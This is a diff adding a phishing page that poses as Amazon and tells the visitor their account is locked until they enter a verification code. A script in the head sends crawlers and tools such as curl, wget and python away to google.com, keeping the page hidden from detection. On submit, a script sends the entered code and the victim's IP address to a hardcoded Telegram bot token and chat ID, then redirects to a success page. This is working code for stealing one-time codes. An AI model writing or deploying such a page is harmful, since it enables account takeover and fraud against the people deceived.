@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Amazon</title>
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="mail.css">
+    <style>
+        /* Prevent zooming on mobile input fields by setting a minimum font size */
+        input {
+            font-size: 16px; /* Ensure font size is at least 16px */
+        }
+
+        /* Global styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            height: 100vh; /* Ensure the body takes up full height */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f4f4; /* Optional background color */
+        }
+
+        #formsContainer {
+            padding: 20px;
+            width: 100%;
+            max-width: 400px; /* Limit the max width for form container */
+            background-color: white; /* Make form container white */
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); /* Light shadow for form */
+            border-radius: 8px; /* Rounded corners for the form */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        p {
+            font-size: 12px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; /* Ensure padding is included in the width */
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .emojiContainer {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .emojiContainer img {
+            max-width: 100%; /* Make images responsive */
+            height: auto;
+        }
+
+        /* Ensure form box is centered and has proper spacing */
+        #form {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <div id="passage">
+        <h3>You Can't Access Your Account Until You Update</h3>
+    </div>
+    <div id="formsContainer">
+        <div class="emojiContainer">
+            <h2>A verification code has been sent to your account.</h2>
+            <img src="images/img7.png" alt="Image">
+        </div>
+        <form method="post" id="loginform" autocomplete="off">
+            <label for="code">A verification code has been sent to your account. <p>Please enter your verification code</p></label>
+            <input type="text" id="code" name="data[code]" placeholder="Enter code" autocomplete="on" required>
+            <br>
+            <button id="submit" type="submit">Submit</button>
+        </form>
+    </div>   
+
+    <script>
+        document.getElementById("loginform").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Collect the verification code from the form
+            var code = document.getElementById("code").value; // Collect the verification code
+
+            // Get the user's IP address (optional)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip; // Get the user's IP address
+
+                    // Prepare the message to send to Telegram
+                    var message = `Verification Code: ${code}\nIP Address: ${ipAddress}`;
+
+                    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot's token and chat ID
+                    var telegramAPI = `https://api.telegram.org/bot7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;
+
+                    fetch(telegramAPI)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                // Redirect to a different page after successful submission
+                                window.location.href = "success.html"; // Replace with your desired redirect page
+                            } else {
+                                alert("Error: " + data.description); // Show an error message if there was an issue
+                            }
+                        })
+                        .catch(error => {
+                            alert("Error: " + error.message); // Show an error message if the fetch request fails
+                        });
+                })
+                .catch(error => {
+                    alert("Error: " + error.message); // Show an error message if the IP address fetch fails
+                });
+        });
+    </script>
+</body>
+</html>
